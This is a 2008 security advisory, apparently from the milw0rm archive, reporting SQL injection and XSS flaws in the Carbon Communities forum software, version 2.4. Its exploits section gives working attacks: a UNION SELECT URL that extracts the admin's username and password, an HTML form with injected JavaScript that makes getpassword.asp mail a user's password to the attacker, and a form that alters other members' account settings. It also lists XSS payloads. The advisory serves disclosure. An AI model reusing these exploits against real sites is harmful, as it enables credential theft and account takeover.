@@ -1,0 +1,113 @@
+########################## www.BugReport.ir #######################################
+#
+#      AmnPardaz Security Research Team
+#
+# Title: Multiple Vulnerabilities in Carbon Communities forum.
+# Vendor: www.carboncommunities.com
+# Vulnerable Version: 2.4 and prior versions
+# Exploit: Available
+# Impact: High
+# Fix: N/A
+# Original Advisory: http://bugreport.ir/index.php?/35
+###################################################################################
+
+
+####################
+1. Description:
+####################
+Carbon Communities is a high powered, fully scalable, and highly customizable online portal, message boards/ bulletin board, discussion hub, Private messaging, Event Calendars, Emails and chat software rolled into one.
+
+####################
+2. Vulnerability:
+####################
+    2.1. There is a SQL Injection in "events.asp?id=[Injection]". By using it, attacker can gain usernames and passwords.
+        2.1.1. POC:
+                Check exploits section.
+    2.2. There is a SQL Injection in "getpassword.asp". By using it, attacker can send any password to his/her email address.(exploit available)
+        2.2.1. POC:
+                Check exploits section.
+    2.3. There is a SQL Injection in "option_Update.asp". By using it, attacker can update member info.(exploit available)
+        2.3.1. POC:
+                Check exploits section.
+    2.4. There are some XSS in "login.asp" and "member_send.asp".
+        2.4.1. POC:
+                /login.asp?Redirect='><script>alert('XSS')</script><fake a='
+                /member_send.asp?OrderBy='><script>alert('XSS')</script><fake a='
+####################
+3. Exploits:
+####################
+
+ Original Exploit URL: http://bugreport.ir/index.php?/35/exploit
+
+ 3.1. Attacker can gain usernames and passwords:
+    -------------
+        http://[CarbonCommunitiesURL]/events.asp?ID=-1 union all select 1,1,1,'Username= '%2bmember_name%2b'<br>Password= '%2bmember_password,1,1,1,1,1,1,1 from tbl_Members where member_name = 'admin'
+    -------------
+ 3.2. Attacker can send any password to his/her email address:
+     -------------
+        <script language="javascript">
+            function check(){
+                document.getElementById("UserName").value = "1' or uCase(Member_Name)='"+ document.getElementById("UserName").value
+            }
+        </script>
+        <form action="http://[CarbonCommunitiesURL]/getpassword.asp" method="post" onsubmit="check()">
+        UserName: <input type="text" name="UserName" id="UserName" value="default" size="100" />
+        <br />
+        EMail: <input type="text" name="EMail" value="Your Email Address" size="100" />
+        <br />
+        <input type="submit" />
+        </form>
+    -------------
+ 3.3. Attacker can update member info.:
+    -------------
+        <form action="http://[CarbonCommunitiesURL]/option_Update.asp?Action=edit" method="post">
+        ID<input type="text" name="ID" value="1"/>
+        <br />
+        Member_Cookies<input type="text" name="Member_Cookies" value="Yes" />
+        <br />
+        Member_SystemCookies<input type="text" name="Member_SystemCookies" value="Yes" />
+        <br />
+        Member_Center<input type="text" name="Member_Center" value="1" />
+        <br />
+        Member_EmailTheadResponse<input type="text" name="Member_EmailTheadResponse" value="1" />
+        <br />
+        Member_EmailPostResponse<input type="text" name="Member_EmailPostResponse" value="1" />
+        <br />
+        Member_WeekStart<input type="text" name="Member_WeekStart" value="0" />
+        <br />
+        Member_ThreadDays<input type="text" name="Member_ThreadDays" value="0" />
+        <br />
+        Member_ThreadView<input type="text" name="Member_ThreadView" value="0" />
+        <br />
+        Member_Invisible<input type="text" name="Member_Invisible" value="1" />
+        <br />
+        Member_HiddenEmail<input type="text" name="Member_HiddenEmail" value="0" />
+        <br />
+        Member_ReceivePM<input type="text" name="Member_ReceivePM" value="1" />
+        <br />
+        Member_PMEmailNotice<input type="text" name="Member_PMEmailNotice" value="1" />
+        <br />
+        Member_PMPopup<input type="text" name="Member_PMPopup" value="1" />
+        <br />
+        Member_Newsletter<input type="text" name="Member_Newsletter" value="0" />
+        <br />
+        Member_TimeZone<input type="text" name="Member_TimeZone" value="0" />
+        <br />
+        Member_DefaultColor<input type="text" name="Member_DefaultColor" value="1" />
+        <br />
+        <input type="submit" />
+        </form>
+    -------------
+####################
+4. Solution:
+####################
+    Edit the source code to ensure that inputs are properly sanitised.
+####################
+- Credit :
+####################
+AmnPardaz Security Research & Penetration Testing Group
+Contact: admin[4t}bugreport{d0t]ir
+WwW.BugReport.ir
+WwW.AmnPardaz.com
+
+# milw0rm.com [2008-04-16]
